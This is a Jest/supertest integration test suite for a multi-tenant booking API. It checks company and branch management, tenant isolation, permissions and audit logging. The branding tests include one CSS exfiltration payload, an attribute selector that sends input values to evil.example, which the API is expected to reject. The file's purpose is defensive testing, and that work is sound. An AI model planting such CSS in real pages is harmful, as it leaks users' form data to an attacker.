import request from 'supertest';
import type { Server } from 'node:http';
import { SYSTEM_ROLES } from '../src/authz/permissions';
import { createTestHarness, type TestHarness } from './support/test-app';
import { seedWorld, type SeededWorld } from './support/seed';

/**
 * ===========================================================================
 * COMPANY AND BRANCH MANAGEMENT
 * ===========================================================================
 *
 * Both modules are addressed as `/companies/:companyId/...`, so every test here
 * is implicitly a tenant test: the id in the path is attacker-controlled and
 * the suite's job is to prove it is never believed.
 */
describe('company and branch management', () => {
  let harness: TestHarness;
  let http: Server;
  let world: SeededWorld;

  /** Owner of company A. */
  let ownerA: string;
  /** Member of company B only — the cross-tenant attacker. */
  let outsider: string;

  let unique = 0;
  const code = () => `BR${Date.now() % 100000}${unique++}`;

  const companyUrl = (companyId = world.companyA.id) => `/api/v1/companies/${companyId}`;
  const branchesUrl = (companyId = world.companyA.id) => `${companyUrl(companyId)}/branches`;

  /** Create a branch in company A and return its id. */
  async function makeBranch(overrides: Record<string, unknown> = {}) {
    const res = await request(http)
      .post(branchesUrl())
      .set('Authorization', `Bearer ${ownerA}`)
      .send({ code: code(), name: 'Test Branch', timezoneName: 'Asia/Ulaanbaatar', ...overrides })
      .expect(201);

    return res.body.data as { id: string; code: string };
  }

  beforeAll(async () => {
    harness = await createTestHarness();
    http = harness.app.getHttpServer() as Server;
    world = await seedWorld(harness.prisma);

    await harness.prisma.companyUser.updateMany({
      where: { companyId: world.companyA.id, userAccountId: world.userA.id },
      data: { isOwner: true },
    });

    ownerA = await harness.staffTokenForCompany(world.userA.email, world.companyA.id);
    outsider = await harness.staffTokenForCompany(world.userB.email, world.companyB.id);
  });

  afterAll(async () => {
    await harness.close();
  });

  // ===========================================================================
  describe('the company profile', () => {
    it('returns the company you are in', async () => {
      const res = await request(http)
        .get(companyUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);

      expect(res.body.data).toMatchObject({
        id: world.companyA.id,
        slug: world.companyA.slug,
        currencyCode: 'MNT',
      });
      // Internal lifecycle bookkeeping is not an API contract.
      expect(res.body.data.purgeAfter).toBeUndefined();
      expect(res.body.data.deletedAt).toBeUndefined();
    });

    it('updates the editable fields', async () => {
      const res = await request(http)
        .patch(companyUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ displayName: 'Renamed Company', contactPhone: '+976 1111 1111' })
        .expect(200);

      expect(res.body.data).toMatchObject({
        displayName: 'Renamed Company',
        contactPhone: '+976 1111 1111',
      });
    });

    it('rejects an unknown timezone by name', async () => {
      const res = await request(http)
        .patch(companyUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ defaultTimezoneName: 'Mars/Olympus_Mons' })
        .expect(400);

      expect(res.body.error.code).toBe('VALIDATION_FAILED');
      expect(JSON.stringify(res.body)).toMatch(/defaultTimezoneName/);
    });

    describe('fields a company may not change about itself', () => {
      it.each([
        ['slug', { slug: 'something-else' }],
        ['status', { status: 'ACTIVE' }],
        ['currencyCode', { currencyCode: 'USD' }],
        ['id', { id: '018f0000-0000-7000-8000-0000000000ff' }],
      ])('refuses %s', async (_label, patch) => {
        // Strict schema: an attempt is a visible 400, not a silent no-op the
        // caller would retry differently.
        await request(http)
          .patch(companyUrl())
          .set('Authorization', `Bearer ${ownerA}`)
          .send(patch)
          .expect(400);
      });

      it('leaves the slug untouched after a refused attempt', async () => {
        await request(http)
          .patch(companyUrl())
          .set('Authorization', `Bearer ${ownerA}`)
          .send({ slug: 'hijacked' })
          .expect(400);

        const after = await harness.prisma.company.findUniqueOrThrow({
          where: { id: world.companyA.id },
        });
        expect(after.slug).toBe(world.companyA.slug);
      });
    });
  });

  // ===========================================================================
  describe('company settings', () => {
    it('returns the provisioned defaults', async () => {
      const res = await request(http)
        .get(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);

      expect(res.body.data.slotGranularityMin).toBe(15);
    });

    it('updates a booking policy value', async () => {
      const res = await request(http)
        .patch(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ slotGranularityMin: 30, requireDeposit: true, depositPercentBps: 2500 })
        .expect(200);

      expect(res.body.data).toMatchObject({
        slotGranularityMin: 30,
        requireDeposit: true,
        depositPercentBps: 2500,
      });
    });

    it('refuses a percentage outside 0–100%', async () => {
      // Mirrors the settings_bps_range CHECK, so the caller gets a 400 naming
      // the field instead of a 500 from a constraint violation.
      await request(http)
        .patch(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ depositPercentBps: 20_000 })
        .expect(400);
    });

    it('needs settings:write, not merely settings:read', async () => {
      const reader = await memberWithRole(SYSTEM_ROLES.READ_ONLY);
      await request(http)
        .get(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${reader}`)
        .expect(200);
      await request(http)
        .patch(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${reader}`)
        .send({ slotGranularityMin: 15 })
        .expect(403);
    });
  });

  // ===========================================================================
  describe('company branding', () => {
    it('returns the schema defaults before anything is customised', async () => {
      const res = await request(http)
        .get(`${companyUrl()}/branding`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);

      expect(res.body.data.primaryColor).toMatch(/^#[0-9A-Fa-f]{6}$/);
    });

    it('creates the row on first write', async () => {
      const res = await request(http)
        .patch(`${companyUrl()}/branding`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ primaryColor: '#123456', bookingPageHeadline: 'Book with us' })
        .expect(200);

      expect(res.body.data).toMatchObject({
        primaryColor: '#123456',
        bookingPageHeadline: 'Book with us',
      });
    });

    it('refuses a malformed colour', async () => {
      await request(http)
        .patch(`${companyUrl()}/branding`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ primaryColor: 'cornflowerblue' })
        .expect(400);
    });

    it('refuses customCss outright', async () => {
      // Arbitrary CSS on a page rendering customer data is an exfiltration
      // primitive — attribute selectors plus background-image read input values
      // out. It stays unreachable until there is a sanitiser and a reason.
      await request(http)
        .patch(`${companyUrl()}/branding`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ customCss: 'input[value^="a"]{background:url(//evil.example/a)}' })
        .expect(400);
    });
  });

  // ===========================================================================
  describe('company lifecycle', () => {
    it('deactivates rather than deleting', async () => {
      // A separate company, so cancelling it does not break every later test.
      const { companyId, token } = await provisionCompany();

      await request(http)
        .delete(`/api/v1/companies/${companyId}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      const row = await harness.prisma.company.findUniqueOrThrow({ where: { id: companyId } });
      expect(row.status).toBe('CANCELED');
      // The row survives, because it owns appointments, payments and a ledger.
      expect(row.deletedAt).toBeNull();
      // And there is a window in which cancelling by mistake is recoverable.
      expect(row.purgeAfter).not.toBeNull();
    });

    it('locks everyone out once cancelled, so it is one-way', async () => {
      /**
       * Not a limitation to work around — the reason `POST /deactivate` has no
       * counterpart. `MembershipService` treats a CANCELED company as not
       * found, so the moment it cancels, every member including the owner is
       * refused. Reactivation has to be a platform operation.
       */
      const { companyId, token } = await provisionCompany();

      await request(http)
        .post(`/api/v1/companies/${companyId}/deactivate`)
        .set('Authorization', `Bearer ${token}`)
        .send({ reason: 'Closing the business' })
        .expect(200);

      await request(http)
        .get(`/api/v1/companies/${companyId}`)
        .set('Authorization', `Bearer ${token}`)
        .expect(404);
    });

    it('records the reason without exposing it to other tenants', async () => {
      const { companyId, token } = await provisionCompany();

      await request(http)
        .post(`/api/v1/companies/${companyId}/deactivate`)
        .set('Authorization', `Bearer ${token}`)
        .send({ reason: 'Merged into another salon' })
        .expect(200);

      const entry = await harness.prisma.auditLog.findFirst({
        where: { action: 'company.deactivated', resourceId: companyId },
      });
      expect(entry?.companyId).toBe(companyId);
    });

    it('refuses a suspended company', async () => {
      // Suspension is a platform decision, usually non-payment.
      const { companyId } = await provisionCompany();
      await harness.prisma.company.update({
        where: { id: companyId },
        data: { status: 'SUSPENDED' },
      });

      // The guard answers before the service does, with 402 rather than 403 —
      // TenantSuspendedError is modelled as billing-blocked so a client can
      // offer to fix the bill instead of showing a dead end. Either way the
      // company cannot deactivate itself out of a suspension.
      const operator = await harness.platformToken(world.operator.email);
      const res = await request(http)
        .post(`/api/v1/companies/${companyId}/deactivate`)
        .set('Authorization', `Bearer ${operator}`)
        .set('X-Company-Id', companyId)
        .send({})
        .expect(402);

      // TENANT_READ_ONLY specifically: a suspended company resolves with
      // operationalStatus READ_ONLY, so `@RequiresWrite()` refuses the mutation
      // in the guard chain — before the service, and without the service
      // needing to know about suspension at all.
      expect(res.body.error.code).toBe('TENANT_READ_ONLY');
    });

    it('rejects an unknown field on the deactivate body', async () => {
      await request(http)
        .post(`${companyUrl()}/deactivate`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ status: 'ACTIVE' })
        .expect(400);
    });
  });

  // ===========================================================================
  describe('branch CRUD', () => {
    it('creates a branch', async () => {
      const branchCode = code();
      const res = await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({
          code: branchCode.toLowerCase(),
          name: 'Downtown',
          timezoneName: 'Asia/Ulaanbaatar',
          city: 'Ulaanbaatar',
          latitude: '47.918733',
          longitude: '106.917701',
        })
        .expect(201);

      // Normalised to uppercase so `hq` and `HQ` cannot coexist and confuse a
      // receptionist reading a printed schedule.
      expect(res.body.data.code).toBe(branchCode.toUpperCase());
      // Coordinates come back as strings: a JS number cannot hold six decimal
      // places of longitude without rounding.
      expect(res.body.data.latitude).toBe('47.918733');
      expect(typeof res.body.data.longitude).toBe('string');
      // The tenant key is not echoed back.
      expect(res.body.data.companyId).toBeUndefined();
    });

    it('lists and reads back', async () => {
      const branch = await makeBranch({ name: 'Listed' });

      const list = await request(http)
        .get(branchesUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);
      expect(list.body.data.items.map((b: { id: string }) => b.id)).toContain(branch.id);

      const one = await request(http)
        .get(`${branchesUrl()}/${branch.id}`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);
      expect(one.body.data.name).toBe('Listed');
    });

    it('updates a branch', async () => {
      const branch = await makeBranch();

      const res = await request(http)
        .patch(`${branchesUrl()}/${branch.id}`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ name: 'Renamed Branch', status: 'TEMPORARILY_CLOSED' })
        .expect(200);

      expect(res.body.data).toMatchObject({
        name: 'Renamed Branch',
        status: 'TEMPORARILY_CLOSED',
      });
    });

    it('soft-deletes, and frees the code for reuse', async () => {
      const branch = await makeBranch();

      await request(http)
        .delete(`${branchesUrl()}/${branch.id}`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(204);

      const row = await harness.prisma.branch.findUniqueOrThrow({ where: { id: branch.id } });
      // The row stays: appointments and payments reference it.
      expect(row.deletedAt).not.toBeNull();

      await request(http)
        .get(`${branchesUrl()}/${branch.id}`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(404);

      // The partial unique index is filtered on deleted_at, so a company that
      // closes HQ and opens a new one can call it HQ.
      await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ code: branch.code, name: 'Reopened', timezoneName: 'UTC' })
        .expect(201);
    });

    describe('branch codes', () => {
      it('refuses a duplicate within the company', async () => {
        const branch = await makeBranch();

        const res = await request(http)
          .post(branchesUrl())
          .set('Authorization', `Bearer ${ownerA}`)
          .send({ code: branch.code, name: 'Clash', timezoneName: 'UTC' })
          .expect(409);

        expect(res.body.error.details?.field).toBe('code');
      });

      it('allows the SAME code in a different company', async () => {
        /**
         * Tenant-local, deliberately. Half the salons in the country want "HQ",
         * and making the first to sign up the owner of that string would be
         * absurd.
         */
        const branch = await makeBranch();
        const { companyId, token } = await provisionCompany();

        await request(http)
          .post(`/api/v1/companies/${companyId}/branches`)
          .set('Authorization', `Bearer ${token}`)
          .send({ code: branch.code, name: 'Their HQ', timezoneName: 'UTC' })
          .expect(201);
      });
    });

    it('rejects an unknown timezone', async () => {
      await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ code: code(), name: 'Bad TZ', timezoneName: 'Nowhere/Nothing' })
        .expect(400);
    });

    it('rejects a companyId in the body', async () => {
      // Strict schema: a branch cannot be moved between tenants through a body.
      await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${ownerA}`)
        .send({
          code: code(),
          name: 'Sneaky',
          timezoneName: 'UTC',
          companyId: world.companyB.id,
        })
        .expect(400);
    });
  });

  // ===========================================================================
  describe('branch settings', () => {
    it('returns all-null before anything is configured', async () => {
      const branch = await makeBranch();

      const res = await request(http)
        .get(`${branchesUrl()}/${branch.id}/settings`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);

      // Null means "inherit the company", not zero — a branch nobody has
      // configured keeps following the company as the company changes.
      expect(res.body.data.slotGranularityMin).toBeNull();
    });

    it('stores an override', async () => {
      const branch = await makeBranch();

      const res = await request(http)
        .patch(`${branchesUrl()}/${branch.id}/settings`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ slotGranularityMin: 20, allowOnlineBooking: false })
        .expect(200);

      expect(res.body.data).toMatchObject({ slotGranularityMin: 20, allowOnlineBooking: false });
    });

    it('404s for a branch in another company', async () => {
      const branch = await makeBranch();

      await request(http)
        .patch(`/api/v1/companies/${world.companyB.id}/branches/${branch.id}/settings`)
        .set('Authorization', `Bearer ${outsider}`)
        .send({ slotGranularityMin: 20 })
        .expect(404);
    });
  });

  // ===========================================================================
  describe('business hours', () => {
    it('replaces the week and marks omitted days closed', async () => {
      const branch = await makeBranch();

      const res = await request(http)
        .put(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({
          days: [
            { dayOfWeek: 1, opensAt: '09:00', closesAt: '18:00' },
            { dayOfWeek: 2, opensAt: '09:00', closesAt: '18:00' },
          ],
        })
        .expect(200);

      expect(res.body.data.days).toHaveLength(7);
      const monday = res.body.data.days.find((d: { dayOfWeek: number }) => d.dayOfWeek === 1);
      expect(monday).toMatchObject({ isClosed: false, opensAt: '09:00', closesAt: '18:00' });

      // Silence about Sunday means closed on Sunday. Carrying a previous value
      // forward would make the result depend on history nobody can see.
      const sunday = res.body.data.days.find((d: { dayOfWeek: number }) => d.dayOfWeek === 0);
      expect(sunday).toMatchObject({ isClosed: true, opensAt: null, closesAt: null });
    });

    it('accepts overnight hours and flags them', async () => {
      /**
       * `22:00 -> 06:00` is valid, not an error. Overnight trading is part of
       * the approved design — `business_hours.crosses_midnight` is maintained
       * by a trigger so the availability engine never has to guess. Rejecting
       * it would break every late-night venue.
       */
      const branch = await makeBranch();

      const res = await request(http)
        .put(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ days: [{ dayOfWeek: 5, opensAt: '22:00', closesAt: '06:00' }] })
        .expect(200);

      const friday = res.body.data.days.find((d: { dayOfWeek: number }) => d.dayOfWeek === 5);
      expect(friday).toMatchObject({ opensAt: '22:00', closesAt: '06:00' });
      // Derived by the database, never sent by the client.
      expect(friday.crossesMidnight).toBe(true);
    });

    it.each([
      ['identical open and close', { dayOfWeek: 1, opensAt: '09:00', closesAt: '09:00' }],
      ['an open day with no times', { dayOfWeek: 1 }],
      ['a closed day carrying times', { dayOfWeek: 1, isClosed: true, opensAt: '09:00' }],
      ['a malformed time', { dayOfWeek: 1, opensAt: '9am', closesAt: '18:00' }],
      ['an out-of-range day', { dayOfWeek: 9, opensAt: '09:00', closesAt: '18:00' }],
    ])('rejects %s', async (_label, day) => {
      const branch = await makeBranch();

      await request(http)
        .put(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ days: [day] })
        .expect(400);
    });

    it('rejects the same day twice', async () => {
      const branch = await makeBranch();

      await request(http)
        .put(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({
          days: [
            { dayOfWeek: 1, opensAt: '09:00', closesAt: '12:00' },
            { dayOfWeek: 1, opensAt: '13:00', closesAt: '18:00' },
          ],
        })
        .expect(400);
    });

    it('reads back only the current version', async () => {
      const branch = await makeBranch();

      await request(http)
        .put(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ days: [{ dayOfWeek: 1, opensAt: '09:00', closesAt: '18:00' }] })
        .expect(200);

      const res = await request(http)
        .get(`${branchesUrl()}/${branch.id}/business-hours`)
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(200);

      expect(res.body.data.days).toHaveLength(7);
    });
  });

  // ===========================================================================
  describe('tenant isolation', () => {
    /**
     * The id in the path is attacker-controlled. Every case below asserts a
     * 404 rather than a 403: the endpoint must not even confirm that the other
     * company exists.
     */
    it('cannot read another company', async () => {
      await request(http)
        .get(companyUrl(world.companyB.id))
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(404);
    });

    it('cannot update another company', async () => {
      await request(http)
        .patch(companyUrl(world.companyB.id))
        .set('Authorization', `Bearer ${ownerA}`)
        .send({ displayName: 'Hijacked' })
        .expect(404);

      const b = await harness.prisma.company.findUniqueOrThrow({
        where: { id: world.companyB.id },
      });
      expect(b.displayName).not.toBe('Hijacked');
    });

    it('cannot deactivate another company', async () => {
      await request(http)
        .delete(companyUrl(world.companyB.id))
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(404);

      const b = await harness.prisma.company.findUniqueOrThrow({
        where: { id: world.companyB.id },
      });
      expect(b.status).not.toBe('CANCELED');
    });

    it('cannot read or write another company’s settings or branding', async () => {
      for (const path of ['settings', 'branding']) {
        await request(http)
          .get(`${companyUrl(world.companyB.id)}/${path}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .expect(404);
        await request(http)
          .patch(`${companyUrl(world.companyB.id)}/${path}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .send(path === 'settings' ? { slotGranularityMin: 45 } : { primaryColor: '#000000' })
          .expect(404);
      }
    });

    it('cannot list another company’s branches', async () => {
      await request(http)
        .get(branchesUrl(world.companyB.id))
        .set('Authorization', `Bearer ${ownerA}`)
        .expect(404);
    });

    describe('a branch id from another tenant', () => {
      it('is not readable even through your OWN company path', async () => {
        // The attack the composite scoping exists for: a valid id, presented
        // under a company you legitimately belong to.
        const mine = await makeBranch();
        const theirs = await harness.prisma.branch.create({
          data: {
            companyId: world.companyB.id,
            code: code(),
            name: 'Theirs',
            timezoneName: 'UTC',
          },
        });

        await request(http)
          .get(`${branchesUrl()}/${theirs.id}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .expect(404);

        // Indistinguishable from a branch that never existed, so a valid id is
        // not an existence oracle. The bodies echo back the id the caller
        // themselves sent, which reveals nothing — everything else must match.
        const unknown = await request(http)
          .get(`${branchesUrl()}/018f0000-0000-7000-8000-0000000000ff`)
          .set('Authorization', `Bearer ${ownerA}`)
          .expect(404);
        const foreign = await request(http)
          .get(`${branchesUrl()}/${theirs.id}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .expect(404);

        expect(foreign.body.error.code).toBe(unknown.body.error.code);
        expect(foreign.body.error.message).toBe(unknown.body.error.message);
        expect(foreign.body.error.details?.resource).toBe(unknown.body.error.details?.resource);

        expect(mine.id).toBeDefined();
      });

      it('cannot be updated or deleted', async () => {
        const theirs = await harness.prisma.branch.create({
          data: {
            companyId: world.companyB.id,
            code: code(),
            name: 'Untouchable',
            timezoneName: 'UTC',
          },
        });

        await request(http)
          .patch(`${branchesUrl()}/${theirs.id}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .send({ name: 'Hijacked' })
          .expect(404);

        await request(http)
          .delete(`${branchesUrl()}/${theirs.id}`)
          .set('Authorization', `Bearer ${ownerA}`)
          .expect(404);

        const after = await harness.prisma.branch.findUniqueOrThrow({ where: { id: theirs.id } });
        expect(after.name).toBe('Untouchable');
        expect(after.deletedAt).toBeNull();
      });

      it('cannot have its business hours rewritten', async () => {
        const theirs = await harness.prisma.branch.create({
          data: {
            companyId: world.companyB.id,
            code: code(),
            name: 'Hours',
            timezoneName: 'UTC',
          },
        });

        await request(http)
          .put(`${branchesUrl()}/${theirs.id}/business-hours`)
          .set('Authorization', `Bearer ${ownerA}`)
          .send({ days: [{ dayOfWeek: 1, opensAt: '00:00', closesAt: '23:59' }] })
          .expect(404);

        const rows = await harness.prisma.businessHours.count({
          where: { branchId: theirs.id },
        });
        expect(rows).toBe(0);
      });
    });
  });

  // ===========================================================================
  describe('permissions', () => {
    it('rejects an anonymous caller', async () => {
      await request(http).get(companyUrl()).expect(401);
      await request(http).get(branchesUrl()).expect(401);
    });

    it('lets a read-only member read but not write', async () => {
      const reader = await memberWithRole(SYSTEM_ROLES.READ_ONLY);

      await request(http).get(companyUrl()).set('Authorization', `Bearer ${reader}`).expect(200);
      await request(http).get(branchesUrl()).set('Authorization', `Bearer ${reader}`).expect(200);

      await request(http)
        .patch(companyUrl())
        .set('Authorization', `Bearer ${reader}`)
        .send({ displayName: 'Nope' })
        .expect(403);

      await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${reader}`)
        .send({ code: code(), name: 'Nope', timezoneName: 'UTC' })
        .expect(403);
    });

    it('lets a branch manager manage branches but not the company', async () => {
      // The permission catalog decides this, not a role name in a controller:
      // BRANCH_MANAGER holds branch:read and settings:read but not
      // company:write.
      const manager = await memberWithRole(SYSTEM_ROLES.BRANCH_MANAGER);

      await request(http).get(branchesUrl()).set('Authorization', `Bearer ${manager}`).expect(200);

      await request(http)
        .patch(companyUrl())
        .set('Authorization', `Bearer ${manager}`)
        .send({ displayName: 'Nope' })
        .expect(403);
    });

    it('rejects an employee from company administration entirely', async () => {
      const employee = await memberWithRole(SYSTEM_ROLES.EMPLOYEE);

      await request(http)
        .get(`${companyUrl()}/settings`)
        .set('Authorization', `Bearer ${employee}`)
        .expect(403);
      await request(http)
        .post(branchesUrl())
        .set('Authorization', `Bearer ${employee}`)
        .send({ code: code(), name: 'Nope', timezoneName: 'UTC' })
        .expect(403);
    });

    it('keeps platform permissions out of company administration', async () => {
      // A platform operator who has NOT targeted a company gets 404, not a
      // company-level pass. Platform authority and company authority are
      // different questions.
      const operator = await harness.platformToken(world.weakOperator.email);
      await request(http).get(companyUrl()).set('Authorization', `Bearer ${operator}`).expect(404);
    });
  });

  // ===========================================================================
  describe('audit', () => {
    it('records company and branch changes against the company', async () => {
      const branch = await makeBranch({ name: 'Audited' });

      const entry = await harness.prisma.auditLog.findFirst({
        where: { action: 'branch.created', resourceId: branch.id },
      });

      expect(entry).not.toBeNull();
      // A company event, so it lands in that company's trail rather than as a
      // platform row its own administrators cannot see.
      expect(entry?.companyId).toBe(world.companyA.id);
      expect(entry?.actorType).toBe('COMPANY_USER');
    });
  });

  // ===========================================================================
  // Helpers
  // ===========================================================================

  /** A member of company A holding exactly one system role. */
  async function memberWithRole(roleKey: string): Promise<string> {
    const known = await harness.prisma.userAccount.findFirstOrThrow({
      where: { id: world.userA.id },
      select: { passwordHash: true },
    });
    const account = await harness.prisma.userAccount.create({
      data: {
        email: `role-${roleKey}-${Date.now()}-${unique++}@example.com`,
        fullName: `${roleKey} Person`,
        status: 'ACTIVE',
        passwordHash: known.passwordHash,
      },
    });
    const membership = await harness.prisma.companyUser.create({
      data: { companyId: world.companyA.id, userAccountId: account.id, status: 'ACTIVE' },
    });
    const role = await harness.prisma.companyRole.findFirstOrThrow({
      where: { companyId: world.companyA.id, key: roleKey },
    });
    await harness.prisma.companyUserRole.create({
      data: { companyId: world.companyA.id, companyUserId: membership.id, roleId: role.id },
    });

    return harness.staffTokenForCompany(account.email, world.companyA.id);
  }

  /** A fresh provisioned company with a signed-in owner. */
  async function provisionCompany(): Promise<{ companyId: string; token: string }> {
    const operator = await harness.platformToken(world.provisioner.email);
    const ownerEmail = `co-owner-${Date.now()}-${unique++}@example.com`;

    const res = await request(http)
      .post('/api/v1/platform/companies')
      .set('Authorization', `Bearer ${operator}`)
      .send({
        slug: `co-${Date.now()}-${unique++}`,
        legalName: 'Temp Co',
        displayName: 'Temp Co',
        defaultTimezoneName: 'UTC',
        currencyCode: 'MNT',
        owner: { email: ownerEmail, fullName: 'Temp Owner' },
      })
      .expect(201);

    const companyId = res.body.data.company.id as string;
    const known = await harness.prisma.userAccount.findFirstOrThrow({
      where: { id: world.userA.id },
      select: { passwordHash: true },
    });
    await harness.prisma.userAccount.update({
      where: { id: res.body.data.owner.userAccountId },
      data: { passwordHash: known.passwordHash, status: 'ACTIVE' },
    });
    await harness.prisma.companyUser.update({
      where: { id: res.body.data.owner.companyUserId },
      data: { status: 'ACTIVE', joinedAt: new Date() },
    });

    return { companyId, token: await harness.staffTokenForCompany(ownerEmail, companyId) };
  }
});
